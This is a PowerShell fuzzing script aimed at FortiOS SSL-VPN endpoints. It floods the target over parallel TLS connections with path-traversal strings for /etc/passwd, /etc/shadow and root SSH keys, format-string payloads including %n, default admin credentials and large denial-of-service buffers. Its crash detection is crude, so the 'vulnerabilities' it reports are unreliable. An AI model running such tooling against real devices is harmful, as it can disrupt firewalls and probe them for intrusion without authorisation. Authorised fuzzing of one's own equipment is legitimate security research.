#!/usr/bin/env pwsh
<#
.SYNOPSIS
FortiOS Fuzzing Toolkit - High Performance Edition
Optimized for maximum throughput with parallel processing

.PARAMETER TargetHost
FortiOS target IP/hostname

.PARAMETER TargetPort
SSL-VPN port (default: 8443)

.PARAMETER IterationsPerEndpoint
Mutations per endpoint (default: 100)

.PARAMETER ParallelConnections
Concurrent SSL connections (default: 5)

.PARAMETER BatchSize
Mutations per batch (default: 10)

.PARAMETER Timeout
Connection timeout in ms (default: 1000)

.EXAMPLE
.\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50 -ParallelConnections 10 -BatchSize 20
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetHost,

    [Parameter(Mandatory=$false)]
    [int]$TargetPort = 8443,

    [Parameter(Mandatory=$false)]
    [int]$IterationsPerEndpoint = 100,

    [Parameter(Mandatory=$false)]
    [int]$ParallelConnections = 5,

    [Parameter(Mandatory=$false)]
    [int]$BatchSize = 10,

    [Parameter(Mandatory=$false)]
    [int]$Timeout = 1000,

    [Parameter(Mandatory=$false)]
    [switch]$Verbose
)

# ============================================================================
# PERFORMANCE OPTIMIZATIONS
# ============================================================================

# Disable progress bars (massive performance impact)
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# Pre-allocate arrays for crash tracking
$script:AllCrashes = New-Object System.Collections.Generic.List[PSObject]
$script:ConnectionPool = New-Object System.Collections.Generic.Queue[object]
$script:Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
$script:IterationCount = 0

# ============================================================================
# FAST LOGGING
# ============================================================================

function Write-InfoMsg {
    param([string]$Message)
    if ($Verbose) {
        Write-Host "[*] $Message" -ForegroundColor Cyan
    }
}

function Write-SuccessMsg {
    param([string]$Message)
    Write-Host "[+] $Message" -ForegroundColor Green
}

function Write-WarningMsg {
    param([string]$Message)
    Write-Host "[!] $Message" -ForegroundColor Yellow
}

# ============================================================================
# OPTIMIZED SSL CONNECTION POOL
# ============================================================================

function New-ConnectionPool {
    param([int]$PoolSize)

    $pool = @()
    for ($i = 0; $i -lt $PoolSize; $i++) {
        $pool += Initialize-SSLConnection
    }
    return $pool
}

function Initialize-SSLConnection {
    try {
        $socket = New-Object System.Net.Sockets.TcpClient
        $socket.ReceiveTimeout = $Timeout
        $socket.SendTimeout = $Timeout
        $socket.NoDelay = $true  # Disable Nagle's algorithm for faster sends

        $socket.Connect($TargetHost, $TargetPort)

        $sslStream = New-Object System.Net.Security.SslStream(
            $socket.GetStream(),
            $false,
            { $true },
            { $null }
        )

        $sslStream.ReadTimeout = $Timeout
        $sslStream.WriteTimeout = $Timeout

        try {
            $sslStream.AuthenticateAsClient($TargetHost)
        } catch {
            # Continue even if auth fails - we'll use it anyway
        }

        return @{
            Socket = $socket
            Stream = $sslStream
            Connected = $true
            LastUsed = [DateTime]::Now
        }
    }
    catch {
        return $null
    }
}

function Recycle-Connection {
    param($Connection)

    if ($Connection) {
        try {
            $Connection.Stream.Close()
            $Connection.Socket.Close()
        } catch { }
    }

    # Return fresh connection
    return Initialize-SSLConnection
}

# ============================================================================
# BATCH MUTATION GENERATOR
# ============================================================================

function New-MutationBatch {
    param(
        [byte[]]$Seed,
        [int]$BatchSize,
        [scriptblock]$MutationFunc
    )

    $batch = @()
    for ($i = 0; $i -lt $BatchSize; $i++) {
        $mutated = & $MutationFunc $Seed
        $batch += $mutated
    }
    return $batch
}

# ============================================================================
# FAST MUTATION FUNCTIONS
# ============================================================================

function Mutate-AuthPayload {
    param([byte[]]$Seed)

    $mutation = Get-Random -Minimum 0 -Maximum 5

    switch ($mutation) {
        0 { $Seed -replace [byte]0x00, [byte]0x41 }
        1 { $Seed + (@(0x41) * (Get-Random -Min 50 -Max 300)) }
        2 { $Seed + [System.Text.Encoding]::UTF8.GetBytes("%x" * 5) }
        3 { $Seed + (@(0xFF) * (Get-Random -Min 20 -Max 100)) }
        4 { [byte[]]@(0x13, 0x88, 0x00, 0x01) + (@(0x41) * 512) }
    }
}

function Mutate-SessionPayload {
    param([byte[]]$Seed)

    $mutation = Get-Random -Minimum 0 -Maximum 4

    switch ($mutation) {
        0 { $Seed + (@(0x41) * 256) }
        1 { $Seed + [System.Text.Encoding]::UTF8.GetBytes("%x.%x.%x") }
        2 { [byte[]]@(0x13, 0x88) + (@(0x00) * 512) }
        3 { $Seed + [System.Text.Encoding]::UTF8.GetBytes("../etc/passwd") }
    }
}

function Mutate-FormatStringPayload {
    param([byte[]]$Seed)

    $formats = @("%x", "%p", "%s", "%n", "%x.%x.%x.%p.%p")
    $selected = $formats[(Get-Random -Min 0 -Max $formats.Count)]

    $payload = $Seed
    for ($i = 0; $i -lt (Get-Random -Min 1 -Max 5); $i++) {
        $payload += [System.Text.Encoding]::UTF8.GetBytes($selected)
    }
    return $payload
}

function Mutate-PathTraversalPayload {
    param([byte[]]$Seed)

    $paths = @("../../../../etc/passwd", "../../../root/.ssh", "....//etc/shadow")
    $selected = $paths[(Get-Random -Min 0 -Max $paths.Count)]

    return $Seed + [System.Text.Encoding]::UTF8.GetBytes($selected)
}

function Mutate-DOSPayload {
    param([byte[]]$Seed)

    $mutation = Get-Random -Minimum 0 -Maximum 4

    switch ($mutation) {
        0 { $Seed + (@(0x00) * 5000) }
        1 { [byte[]]@(0x13, 0x88) + (@(0xFF) * 32768) }
        2 { $Seed * 50 }
        3 { [byte[]]@(0x13, 0x88) + (@(0x41) * 65536) }
    }
}

# ============================================================================
# FAST RESPONSE ANALYSIS
# ============================================================================

function Analyze-Response-Fast {
    param(
        [byte[]]$Response,
        [byte[]]$Payload
    )

    if (-not $Response -or $Response.Length -eq 0) {
        return "UNKNOWN"
    }

    # Quick binary checks first (no string conversion)
    if ([System.BitConverter]::ToInt32($Response, 0) -eq 0x64617461) {
        return "AUTH_BYPASS"
    }

    # String conversion only if needed
    $str = [System.Text.Encoding]::UTF8.GetString($Response, 0, [Math]::Min(1024, $Response.Length))

    if ($str -match "root:" -or $str -match "BEGIN") {
        return "PATH_TRAVERSAL"
    }

    if ($str -match "0x[0-9a-f]{4,}" -or ($str -match "0x" | Measure-Object).Count -gt 3) {
        return "FORMAT_STRING"
    }

    if ($str -match "error|crash|segmentation") {
        return "BUFFER_OVERFLOW"
    }

    return "UNKNOWN"
}

# ============================================================================
# BATCH FUZZING ENGINE
# ============================================================================

function Invoke-BatchFuzz {
    param(
        [string]$EndpointName,
        [byte[]]$SeedPayload,
        [scriptblock]$MutationFunc,
        [int]$TotalIterations,
        [int]$ConnectionCount
    )

    Write-SuccessMsg "Fuzzing: $EndpointName ($TotalIterations iterations, $ConnectionCount connections)"

    $batchCount = [Math]::Ceiling($TotalIterations / $BatchSize)
    $crashes = 0
    $lastUpdate = [DateTime]::Now

    # Create connection pool
    $connPool = @()
    for ($i = 0; $i -lt $ConnectionCount; $i++) {
        $conn = Initialize-SSLConnection
        if ($conn) { $connPool += $conn }
    }

    Write-InfoMsg "Connection pool ready: $($connPool.Count) connections"

    # Fuzz in batches
    for ($batch = 0; $batch -lt $batchCount; $batch++) {
        $batchIter = [Math]::Min($BatchSize, $TotalIterations - ($batch * $BatchSize))

        # Generate mutations for this batch
        $mutations = New-MutationBatch -Seed $SeedPayload -BatchSize $batchIter -MutationFunc $MutationFunc

        # Send mutations in parallel across connection pool
        $connIndex = 0
        foreach ($mutated in $mutations) {
            $conn = $connPool[$connIndex % $connPool.Count]

            try {
                $conn.Stream.Write($mutated, 0, $mutated.Length)
                $conn.Stream.Flush()

                # Try to receive response with short timeout
                $buffer = New-Object byte[] 4096
                $readCount = $conn.Stream.Read($buffer, 0, $buffer.Length)

                if ($readCount -gt 0) {
                    $response = $buffer[0..($readCount-1)]
                    $result = Analyze-Response-Fast -Response $response -Payload $mutated

                    if ($result -ne "UNKNOWN") {
                        $script:AllCrashes.Add(@{
                            endpoint = $EndpointName
                            type = $result
                            size = $mutated.Length
                            timestamp = (Get-Date).ToString("o")
                        })
                        $crashes++
                    }
                }
            }
            catch {
                # Connection error - recycle
                $connPool[$connIndex % $connPool.Count] = Recycle-Connection -Connection $conn
            }

            $connIndex++
            $script:IterationCount++

            # Progress update every 50 iterations
            if ($script:IterationCount % 50 -eq 0) {
                $elapsed = [DateTime]::Now - $lastUpdate
                $rate = 50 / $elapsed.TotalSeconds
                Write-InfoMsg "Progress: $($script:IterationCount)/$($script:Iterations | Measure-Object -Sum | Select-Object -ExpandProperty Sum) | Rate: $([Math]::Round($rate, 1)) iter/s | Crashes: $crashes"
                $lastUpdate = [DateTime]::Now
            }
        }
    }

    # Cleanup connections
    foreach ($conn in $connPool) {
        try {
            $conn.Stream.Close()
            $conn.Socket.Close()
        } catch { }
    }

    return $crashes
}

# ============================================================================
# SEED PAYLOADS (Pre-built)
# ============================================================================

$SeedPayloads = @{
    "Auth" = [byte[]]@(0x13, 0x88, 0x00, 0x01) + [System.Text.Encoding]::UTF8.GetBytes("admin`0password`0")
    "Session" = [byte[]]@(0x13, 0x88, 0x00, 0x09) + (@(0x00) * 30) + [System.Text.Encoding]::UTF8.GetBytes("test_user`0")
    "Log" = [byte[]]@(0x13, 0x88, 0x00, 0x05) + (@(0x00) * 30) + [System.Text.Encoding]::UTF8.GetBytes("[VPN] test`0")
    "File" = [System.Text.Encoding]::UTF8.GetBytes("GET /api/v2/system/admin/test HTTP/1.1`r`nHost: $TargetHost`r`nConnection: close`r`n`r`n")
    "Connection" = [byte[]]@(0x13, 0x88, 0x00, 0x02) + (@(0x00) * 256)
}

# ============================================================================
# OPTIMIZED REPORT GENERATION
# ============================================================================

function New-FastReport {
    $timestamp = (Get-Date).ToUniversalTime().ToString("o")
    $duration = $script:Stopwatch.Elapsed.TotalSeconds
    $rate = $script:IterationCount / $duration

    $byType = @{}
    foreach ($crash in $script:AllCrashes) {
        $type = $crash.type
        if (-not $byType[$type]) { $byType[$type] = 0 }
        $byType[$type]++
    }

    $report = @{
        target = $TargetHost
        port = $TargetPort
        timestamp = $timestamp
        total_crashes = $script:AllCrashes.Count
        total_iterations = $script:IterationCount
        duration_seconds = $duration
        rate_iter_per_sec = [Math]::Round($rate, 2)
        vulnerabilities_by_type = $byType
        crashes = @($script:AllCrashes | Select-Object -First 50)
    }

    $reportFile = "fortios_fuzz_report_$($TargetHost)_optimized_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
    $json = ConvertTo-Json -InputObject $report -Depth 10
    Set-Content -Path $reportFile -Value $json -Encoding UTF8

    return $report
}

# ============================================================================
# MAIN CAMPAIGN
# ============================================================================

function Start-OptimizedCampaign {
    Write-SuccessMsg "========================================="
    Write-SuccessMsg "FORTIOS FUZZING - HIGH PERFORMANCE"
    Write-SuccessMsg "========================================="
    Write-InfoMsg "Target: $TargetHost`:$TargetPort"
    Write-InfoMsg "Parallel Connections: $ParallelConnections"
    Write-InfoMsg "Batch Size: $BatchSize"
    Write-InfoMsg "Timeout: ${Timeout}ms"
    Write-InfoMsg ""

    $script:Iterations = @(
        $IterationsPerEndpoint,
        $IterationsPerEndpoint,
        $IterationsPerEndpoint,
        $IterationsPerEndpoint,
        $IterationsPerEndpoint
    )

    $endpoints = @(
        @{ Name = "Auth"; Seed = $SeedPayloads["Auth"]; Mutation = ${function:Mutate-AuthPayload} }
        @{ Name = "Session"; Seed = $SeedPayloads["Session"]; Mutation = ${function:Mutate-SessionPayload} }
        @{ Name = "Log"; Seed = $SeedPayloads["Log"]; Mutation = ${function:Mutate-FormatStringPayload} }
        @{ Name = "File"; Seed = $SeedPayloads["File"]; Mutation = ${function:Mutate-PathTraversalPayload} }
        @{ Name = "Connection"; Seed = $SeedPayloads["Connection"]; Mutation = ${function:Mutate-DOSPayload} }
    )

    foreach ($endpoint in $endpoints) {
        Invoke-BatchFuzz -EndpointName $endpoint.Name `
                         -SeedPayload $endpoint.Seed `
                         -MutationFunc $endpoint.Mutation `
                         -TotalIterations $IterationsPerEndpoint `
                         -ConnectionCount $ParallelConnections
    }

    Write-InfoMsg ""
    $report = New-FastReport

    Write-SuccessMsg "========================================="
    Write-SuccessMsg "CAMPAIGN COMPLETE"
    Write-SuccessMsg "========================================="
    Write-SuccessMsg "Total Iterations: $($report.total_iterations)"
    Write-SuccessMsg "Vulnerabilities: $($report.total_crashes)"
    Write-SuccessMsg "Duration: $([Math]::Round($report.duration_seconds, 2))s"
    Write-SuccessMsg "Throughput: $($report.rate_iter_per_sec) iter/sec"
    Write-InfoMsg ""

    if ($report.vulnerabilities_by_type) {
        Write-WarningMsg "Vulnerabilities by Type:"
        foreach ($type in $report.vulnerabilities_by_type.Keys) {
            Write-WarningMsg "  [$($report.vulnerabilities_by_type[$type])] $type"
        }
    }

    Write-SuccessMsg "========================================="
}

Start-OptimizedCampaign
